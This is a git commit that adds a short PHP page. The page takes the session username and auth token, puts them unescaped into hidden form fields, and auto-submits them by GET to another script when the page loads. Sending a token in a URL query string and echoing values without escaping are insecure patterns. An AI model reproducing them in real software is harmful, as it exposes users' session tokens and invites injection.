6aba205193af191adb3cbb4768cf8cb0bfab3a5f
BadBoyLu <68569513+badboylu@users.noreply.github.com>
2021-01-27 10:39:28 +0200

    Create processF.php

---
+++ processF.php
@@ -0,0 +1,17 @@
+<?php
+session_start();
+$user = $_SESSION['username'];
+$auth = $_SESSION['token'];
+?>
+<html>
+<form action="F1.php" method="get" id="key">
+<input name="username" type="hidden" value="<?php echo $user; ?>">
+<input name="auth" type="hidden" value="<?php echo $auth; ?>">
+</form>
+<script>
+function keys(){
+document.getElementById("key").submit();
+}
+keys();
+</script>
+<html>
